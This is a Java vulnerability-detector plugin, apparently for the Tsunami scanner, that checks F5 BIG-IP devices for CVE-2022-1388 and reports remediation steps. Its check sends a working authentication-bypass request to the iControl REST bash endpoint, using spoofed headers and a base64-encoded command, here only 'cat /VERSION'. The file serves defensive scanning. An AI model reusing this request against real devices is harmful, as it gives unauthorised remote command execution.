/*
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.cves.cve20221388;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.AUTHORIZATION;
import static com.google.common.net.HttpHeaders.CONNECTION;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.common.net.HttpHeaders.HOST;
import static com.google.common.net.HttpHeaders.USER_AGENT;
import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.io.BaseEncoding;
import com.google.common.net.MediaType;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects the CVE-2022-1388 vulnerability. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "CVE20221388VulnDetector",
    version = "0.1",
    description = Cve20221388VulnDetector.VULN_DESCRIPTION,
    author = "hh-hunter",
    bootstrapModule = Cve20221388DetectorBootstrapModule.class)
public final class Cve20221388VulnDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static final String VUL_PATH = "mgmt/tm/util/bash";

  /**
   * Payload for the CVE-2022-1388 vulnerability. <code>
   *      {
   *        "command": "run",
   *        "utilCmdArgs": "-c 'cat /VERSION'"
   *      }
   *   </code> payload is encoded in base64.
   */
  private static final String POST_DATA =
      "ewogICJjb21tYW5kIjogInJ1biIsCiAgInV0aWxDbWRBcmdzIjogIi1jICdjYXQgL1ZFUlNJT04nIgp9";

  @VisibleForTesting static final String DETECTION_STRING = "tm:util:bash:runstate";

  @VisibleForTesting
  static final String VULN_DESCRIPTION =
      "On F5 BIG-IP 16.1.x versions prior to 16.1.2.2, 15.1.x versions prior to 15.1.5.1, 14.1.x "
          + "versions prior to 14.1.4.6, 13.1.x versions prior to 13.1.5, and all 12.1.x and 11.6.x"
          + " versions, undisclosed requests may bypass iControl REST authentication.";

  private final HttpClient httpClient;
  private final Clock utcClock;

  @Inject
  Cve20221388VulnDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.httpClient = checkNotNull(httpClient);
    this.utcClock = checkNotNull(utcClock);
  }

  private static boolean isWebServiceOrUnknownService(NetworkService networkService) {
    return networkService.getServiceName().isEmpty()
        || NetworkServiceUtils.isWebService(networkService)
        || NetworkServiceUtils.getServiceName(networkService).equals("unknown");
  }

  private static StringBuilder buildTarget(NetworkService networkService) {
    StringBuilder targetUrlBuilder = new StringBuilder();
    if (NetworkServiceUtils.isWebService(networkService)) {
      targetUrlBuilder.append(NetworkServiceUtils.buildWebApplicationRootUrl(networkService));
    } else {
      targetUrlBuilder
          .append("https://")
          .append(toUriAuthority(networkService.getNetworkEndpoint()))
          .append("/");
    }
    return targetUrlBuilder;
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("CVE-2022-1388 starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(Cve20221388VulnDetector::isWebServiceOrUnknownService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetVulnerabilityUrl = buildTarget(networkService).append(VUL_PATH).toString();
    try {
      byte[] payload = BaseEncoding.base64().decode(POST_DATA);
      HttpResponse httpResponse =
          httpClient.send(
              post(targetVulnerabilityUrl)
                  .setHeaders(
                      HttpHeaders.builder()
                          .addHeader(HOST, "127.0.0.1")
                          .addHeader(AUTHORIZATION, "Basic YWRtaW46")
                          .addHeader(CONNECTION, "x-F5-Auth-token")
                          .addHeader("X-F5-Auth-token", "TSUNAMI_SCANNER")
                          .addHeader(USER_AGENT, "TSUNAMI_SCANNER")
                          .addHeader(CONTENT_TYPE, MediaType.JSON_UTF_8.toString())
                          .build())
                  .setRequestBody(ByteString.copyFrom(payload))
                  .build(),
              networkService);
      logger.atInfo().log("Response: %s", httpResponse.bodyString().get());
      if (httpResponse.status().code() == 200
          && httpResponse.bodyString().get().contains(DETECTION_STRING)) {
        return true;
      }
    } catch (IOException | AssertionError e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
      return false;
    }
    return false;
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE_2022_1388"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("CVE-2022-1388 F5 BIG-IP iControl REST Auth Bypass RCE")
                .setRecommendation(
                    "Update the BIG-IP installation to a version that provides a fix "
                        + "(17.0.0, 16.1.2.2, 15.1.5.1, 14.1.4.6 or 13.1.5) or implement the "
                        + "recommended mitigation measures to protect the affected devices/modules,"
                        + " Blocking iControl REST access through the self IP address, Blocking"
                        + " iControl REST access through the management interface,Modifying the"
                        + " BIG-IP httpd configuration")
                .setDescription(VULN_DESCRIPTION))
        .build();
  }
}
